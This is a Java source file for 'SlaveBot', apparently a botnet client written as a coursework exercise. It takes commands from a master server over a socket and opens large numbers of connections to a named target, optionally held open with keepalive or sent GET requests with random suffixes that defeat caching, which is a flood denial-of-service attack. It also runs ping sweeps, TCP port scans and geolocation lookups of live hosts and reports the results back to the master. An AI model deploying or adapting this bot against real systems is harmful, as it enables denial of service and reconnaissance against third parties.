

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Random;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SlaveBot 
{
	public static ArrayList<Client_connections> Target_List;
	// public static ArrayList IpAddressList = new ArrayList();
	// public static ArrayList TargetPortList = new ArrayList();
	static String Target_name;
	static int Target_port;
	static int Number_ofconn;
	static Socket host_comm;
	static String command5;
	static String[] command ;
	
	public static void main(String[] args) throws Exception 
	{
		String Local_host = null;
		int Port_number=0;
		Socket server_comm = null;
		String Client_input = null;
		
		if(args.length>4 || args.length<3)
		{
			System.out.println("Incorrect Slave Command");
		}
		else if (args.length==4)
		{
			if(args[0].equals("-h") && args[2].equals("-p"))
			{
				Local_host=args[1];
				Port_number=Integer.parseInt(args[3]);
	 		}
			else
			{
				System.out.println("Input is invalid use -h and -p option for the command");
				System.exit(0);
			}
		try
		{
			server_comm = new Socket(Local_host,Port_number);
		}
		catch(Exception e)
		{
			System.out.println(e.getStackTrace().toString());
		}	
		while(true)
		{
		Scanner sc=new Scanner(server_comm.getInputStream());
		Client_input = sc.nextLine();
		command = Client_input.split(" ");
		if(command[0].equals("connect"))
		{
		  if (command.length < 4) 
		  {
			System.out.println("Incorrect connect command");
		  } 
		  else
		  {
				Target_name=command[1];
				Target_port=Integer.parseInt(command[2]);
				Number_ofconn=Integer.parseInt(command[3]);
				command5=command[4];
				Target_List=new ArrayList<Client_connections>();
				for(int i=0; i<Number_ofconn; i++)
				{
					try
					{
					Client_connections cli_conn = new Client_connections();
					host_comm=new Socket(Target_name,Target_port);
					if(command.length==5)
					{	
					  if(command5.equalsIgnoreCase("keepalive"))
					  {
						System.out.println("I am at keepalive");  
						host_comm.setKeepAlive(true);
					  }
					  else if (command5.matches("^url=[^ ]+$")) 
					  {
						String URL = command5.substring(4);
						String randomCode = createRandomCode(10, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
						String Final_URL = URL + randomCode ;
						BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(host_comm.getOutputStream(), "UTF8"));
				        writer.write("GET " + Final_URL + "\r\n");
				        writer.write("\r\n");
				        writer.flush();
				        BufferedReader reader = new BufferedReader(new InputStreamReader(host_comm.getInputStream()));
				        String responseLine;
				        if((responseLine = reader.readLine()) != null)
				        {
				        	System.out.println("I got the response and here is the first line: " + responseLine);
					    }
				        System.out.println("Connected Via: " + host_comm.getInetAddress().getLocalHost()+ ":" + host_comm.getLocalPort());
					   }
				    }
					cli_conn.Host_socket = host_comm;
					cli_conn.Host_address=host_comm.getInetAddress().getHostAddress();
					cli_conn.Host_name=host_comm.getInetAddress().getHostName();
					cli_conn.Host_port = Target_port;
				    Target_List.add(cli_conn);
					}
					catch(IOException e)
					{
						System.out.println(e.getStackTrace().toString());
					}
				}
			}
		 }
		if(command[0].equals("disconnect"))
		{
			if (command.length < 3) 
			{
				System.out.println("Incorrect disconnect command");
			}
			else
			{
				Iterator<Client_connections> iterate = Target_List.iterator();
				int targetport=0;
				targetport = Integer.parseInt(command[2]);
				if (command[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true)
				{
				  int found = 0;
					  if(targetport==0)
					  {
						  for(int i=0; i<Target_List.size();i++ )
						  {
							  if(Target_List.get(i).Host_address.equals(command[1]))
							  {
								  Target_List.get(i).Host_socket.close();
								  Target_List.remove(i);
								  found=1;
							  }
						  }				
					  }
					  else
					  {
						  for(int i=0; i<Target_List.size();i++ )
						  {
							  if(Target_List.get(i).Host_address.equals(command[1])&&Target_List.get(i).Host_port==targetport)
							  {
								  Target_List.get(i).Host_socket.close();
								  Target_List.remove(i);
								  found=1;
							  }
						  }
					  }
				  if(found == 0)
				  {
					  System.out.println("Incorrect host address or port in disconnect!!");
				  }
				}
				else
				{
					int found = 0;
						  if(targetport==0)
						  {
							  for(int i=0; i<Target_List.size();i++ )
							  {
								  if(Target_List.get(i).Host_name.equals(command[1]))
								  {
									  Target_List.get(i).Host_socket.close();
									  Target_List.remove(i);
									  found=1;
								  }
							  }
						  }
						  else
						  {
							  for(int i=0; i<Target_List.size();i++ )
							  {
								  if(Target_List.get(i).Host_name.equals(command[1]) && Target_List.get(i).Host_port==targetport)
								  {
									  Target_List.get(i).Host_socket.close();
									  Target_List.remove(i);
									  found=1;
								  }
							  }					
						  }
					  if(found == 0)
					  {
						  System.out.println("Incorrect host address or port in disconnect!!");
					  }
				  }
			  }
		  }
		
		if(command[0].equals("ipscan"))
		{
		    ArrayList IpAddressList = new ArrayList();
			String IpAddressRange=command[1];
			String[] parts = IpAddressRange.split("-");
			String start = parts[0]; 
			String end = parts[1];
			
			String[] startParts = start.split("(?<=\\.)(?!.*\\.)");
			String[] endParts = end.split("(?<=\\.)(?!.*\\.)");
		  
		    
		    int first = Integer.parseInt(startParts[1]);
		    int last = Integer.parseInt(endParts[1]);

			String ListOfIpAddresses ="";
			
		    for (int i = first; i <= last; i++) 
		    {
		    	String IpAddress = startParts[0] + i ;
				
		    	boolean result = isReachable(1, 5000, IpAddress);
		    	
				//System.out.println("output : "  + result);
				
				if(result)
				{
					IpAddressList.add(IpAddress);
				}
				
				
		    }
		    
		    for(int j=0, length=IpAddressList.size(); j<length; j++)
				ListOfIpAddresses+=(j==0?"":", ") + IpAddressList.get(j);
			
			
			
		    
		    PrintStream p = new PrintStream(server_comm.getOutputStream());
			p.println(ListOfIpAddresses);
			
			p.flush();

		}
		
		if(command[0].equals("tcpportscan"))
		{
			ArrayList TargetPortList = new ArrayList();
			String TargetPortNumberRange = command[2];
			String[] parts = TargetPortNumberRange.split("-");
			int part1 = Integer.parseInt(parts[0]); 
			int part2 = Integer.parseInt(parts[1]);
			
			  for (int i = part1; i <= part2; i++) 
			    {
				  int TargetPort=i;
					
			        boolean result = isPortInUse(command[1],TargetPort);
					//System.out.println("output : "  + result);
					
					if(result)
					{
						TargetPortList.add(TargetPort);
						
					}
			    }
			 
			  String ListOfTargetPorts ="";
			  
			  for(int j=0, length=TargetPortList.size(); j<length; j++)
				  ListOfTargetPorts+=(j==0?"":", ") + TargetPortList.get(j);
				
				//System.out.println(ListOfTargetPorts);
				
			    
			    PrintStream p = new PrintStream(server_comm.getOutputStream());
				p.println(ListOfTargetPorts);
				p.flush();
			  
	 	}
		
		if(command[0].equals("geoipscan"))
		{
		    ArrayList IpAddressList = new ArrayList();
			String IpAddressRange=command[1];
			String[] parts = IpAddressRange.split("-");
			String start = parts[0]; 
			String end = parts[1];
			
			String[] startParts = start.split("(?<=\\.)(?!.*\\.)");
			String[] endParts = end.split("(?<=\\.)(?!.*\\.)");
		  
		    
		    int first = Integer.parseInt(startParts[1]);
		    int last = Integer.parseInt(endParts[1]);
			
			StringBuilder builder = new StringBuilder();
			
		    for (int i = first; i <= last; i++) 
		    {
		    	String IpAddress = startParts[0] + i ;
				
		    	boolean result = isReachable(1, 5000, IpAddress);
		    	
				if(result)
				{
					 //Using api to get the geolocation of the particular IpAddress.
					 String text = callURL("http://ip-api.com/csv/" + IpAddress) ;
					 
					  //The response will contain success in the beginning.
					  //If its success, geolocation of that IpAddress can be obtained.
					  char a_char = text.charAt(0);
					  ArrayList TextList = new ArrayList();
					  
					  if(a_char == 's')
					  {
						  //To remove success from the response
						  String response=text.substring(8);
						  
						  //Server response will contain the IpAddress. But its not needed.
						  //To remove the IpAddress from the server returned(response) string. 
						  //Splitting the response by comma and comparing it with IpAddress.
						  String[] TextSeperatedArray = response.split(",");
						  
						  for(int j=0 ; j<TextSeperatedArray.length ; j++)
						  {
							  String SingleValue=TextSeperatedArray[j];
						
							  //If the value matches IpAddress, replace it with blankspace.
							  if(SingleValue.equalsIgnoreCase(IpAddress))
							  {
								  SingleValue = " "; 
								
							  }
							  TextList.add(SingleValue);
						  }
						  
				          String TextLine="";
						  
						  for(int k=0, length=TextList.size(); k<length; k++)
							  TextLine+=(k==0?"":", ") + TextList.get(k);
						  
						   //To remove comma(the last character) from the IpAddress removed line.
						    Pattern p = Pattern.compile("[, ]+$");
							Matcher m = p.matcher(TextLine);
							String clean = m.replaceFirst("");
							
				            builder.append( IpAddress + " " + clean + "\n" );
					  }
					  else
					  {
						  System.out.println("Check the geoipscan command");
					  }
				}
	    }
	
		    PrintStream p = new PrintStream(server_comm.getOutputStream());
			p.println(builder.toString());
			p.flush();

		}
		
		
		}	
	  }
	}
	
	private static boolean isReachable(int nping, int wping, String ipping) throws Exception 
	{
		 String strCommand = "";
		 if(System.getProperty("os.name").startsWith("Windows")) 
		 {
		 // construct command for Windows Operating system
		 strCommand = "ping -n " + nping + " -w " + wping + " " + ipping;
		 }
		 else 
		 {
		 // construct command for Linux and OSX
		 strCommand = "ping -c 1 " + ipping;
		 }
	    Runtime runtime = Runtime.getRuntime();
	    Process process1 = runtime.exec(strCommand);
	    Scanner sc3 = new Scanner(process1.getInputStream());
	    process1.waitFor();
	    
	    ArrayList<String> list = new ArrayList<>();
	    String data = "";
	    
	    while (sc3.hasNextLine()) {
	        String string1 = sc3.nextLine();
	        data = data + string1 + "\n";
	        list.add(string1);
	    }

	    if (data.contains("IP address must be specified.")
	            || (data.contains("Ping request could not find host " + ipping + ".")
	            || data.contains("Please check the name and try again."))) {
	        throw new Exception(data);
	    } else if (nping > list.size()) {
	        throw new Exception(data);
	    }

	    int connections_made = 0;
	    int connections_lost = 0;
	    int index = 2;

	    for (int i = index; i < nping + index; i++) {
	        String string2 = list.get(i);
	        if (string2.contains("Destination host unreachable.")) {
	        	connections_lost++;
	        } else if (string2.contains("Request timed out.")) {
	        	connections_lost++;
	        } else if (string2.contains("bytes") && string2.contains("time") && string2.contains("TTL")) {
	        	connections_made++;
	        } else {
	        }
	    }

	    return connections_made > 0;
	}
	
	private static boolean isPortInUse(String hostName, int portNumber) 
	{
        boolean result;

        try {

            Socket s = new Socket(hostName, portNumber);
            s.close();
            result = true;

        }
        catch(Exception e) {
            result = false;
        }

        return(result);
     }
	
	 public static String createRandomCode(int codeLength, String id){   
	     char[] chars = id.toCharArray();
	        StringBuilder sb = new StringBuilder();
	        Random random = new SecureRandom();
	        for (int i = 0; i < codeLength; i++) {
	            char c = chars[random.nextInt(chars.length)];
	            sb.append(c);
	        }
	        String output = sb.toString();
	        return output ;
	    } 
	 
	 public static String callURL(String myURL) {
			//System.out.println("Requeted URL:" + myURL);
			StringBuilder sb = new StringBuilder();
			URLConnection urlConn = null;
			InputStreamReader in = null;
			try {
				URL url = new URL(myURL);
				urlConn = url.openConnection();
				if (urlConn != null)
					urlConn.setReadTimeout(5 * 1000);
				if (urlConn != null && urlConn.getInputStream() != null) {
					in = new InputStreamReader(urlConn.getInputStream(),
							Charset.defaultCharset());
					BufferedReader bufferedReader = new BufferedReader(in);
					if (bufferedReader != null) {
						int cp;
						while ((cp = bufferedReader.read()) != -1) {
							sb.append((char) cp);
						}
						bufferedReader.close();
					}
				}
			in.close();
			} catch (Exception e) {
				throw new RuntimeException("Exception while calling URL:"+ myURL, e);
			} 
			
			return sb.toString();
		}
}
	
	
	



	
	
	
	



